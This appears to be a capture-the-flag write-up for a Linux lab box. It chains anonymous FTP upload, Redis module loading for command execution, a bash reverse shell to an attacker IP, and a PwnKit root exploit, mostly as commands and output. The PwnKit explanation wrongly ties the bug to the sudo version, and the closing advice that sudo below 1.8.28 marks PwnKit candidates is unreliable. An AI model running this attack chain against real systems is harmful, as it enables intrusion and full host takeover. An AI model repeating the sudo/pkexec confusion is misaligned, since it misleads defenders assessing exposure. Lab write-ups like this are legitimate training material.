#Linux #Redis #FTP #RedisModules #RCE #PwnKit #CVE-2021-4034 #AnonymousFTP

## Overview

Sybarys is a Linux box that demonstrates an underappreciated attack path: using anonymous FTP write access to plant a Redis module on disk, then loading that module into an unauthenticated Redis instance to gain RCE. The foothold arrives as `pablo` via a reverse shell triggered directly through Redis. Privilege escalation is PwnKit (CVE-2021-4034), same vulnerability as Snookums, applied to a different distro.

## Recon

### Port Scan

```sh
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.2  (anonymous login; pub/ is world-writable)
22/tcp   open  ssh     OpenSSH 7.4
80/tcp   open  http    Apache httpd 2.4.6 (CentOS) PHP/7.3.22  (HTMLy blog)
6379/tcp open  redis   Redis 5.0.9   (no authentication)
```

Two facts immediately stand out: FTP anonymous login is allowed and the `pub/` directory is writable (`drwxrwxrwx`), and Redis is exposed on its default port with no password.

> **Why unauthenticated Redis is dangerous:** Redis is designed as an in-process cache and assumes it runs on a trusted interface. When exposed externally with no `requirepass` set, an attacker has full control, they can read and write all keys, but more critically, Redis 4.0+ supports dynamically loading native `.so` modules. A module can expose arbitrary OS-level commands.

## Foothold

### Redis Module for RCE

I downloaded the `RedisModules-ExecuteCommand` module from `https://github.com/n0b0dyCN/RedisModules-ExecuteCommand` and uploaded the compiled `module.so` to the writable FTP directory:

```sh
# FTP session
ftp anonymous@192.168.180.93
ftp> put module.so pub/module.so
```

Then connected to Redis and loaded the module directly from that path:

```sh
redis-cli -h 192.168.180.93
192.168.180.93:6379> MODULE LOAD /var/ftp/pub/module.so
OK
192.168.180.93:6379> system.exec "id"
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
```

With RCE confirmed as `pablo`, I triggered a reverse shell:

```sh
192.168.180.93:6379> system.exec "bash -i >& /dev/tcp/192.168.45.244/6379 0>&1"
```

Shell caught on port 6379:

```sh
rlwrap nc -lvnp 6379
connect to [192.168.45.244] from (UNKNOWN) [192.168.180.93] 46778
[pablo@sybaris /]$ whoami
pablo
```

TTY upgrade:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### PwnKit (CVE-2021-4034)

LinPEAS reported the sudo version:

```
Sudo version 1.8.23
```

Same vulnerable version as on Snookums. The Python PoC from `https://github.com/joeammond/CVE-2021-4034` escalated directly:

```sh
[pablo@sybaris tmp]$ python pwn.py
[+] Creating shared library for exploit code.
[+] Calling execve()
[root@sybaris tmp]# whoami
root
```

> **CVE-2021-4034 in brief:** PwnKit exploits a memory-corruption bug in `pkexec` (polkit's command-line tool) that allows any local user to execute code as root. The vulnerability existed in every polkit version since 2009 and was patched in January 2022. Sudo version 1.8.23 predates the patch, which is why it flags the issue, polkit and sudo share the same host and the version tells you the system is old enough to be affected.

## Root

```sh
[root@sybaris root]# cat proof.txt
‹redacted›
```

## Takeaways

- **World-writable FTP directories adjacent to other listening services are an attack chain waiting to happen.** The FTP `pub/` folder fed the Redis module path directly.
- **Redis with no `requirepass` and no bind restriction is root-equivalent on the host.** Module loading converts it from a data store to an OS command runner.
- **Check the sudo version with LinPEAS on every box.** Versions below 1.8.28 on unpatched systems are candidates for PwnKit.
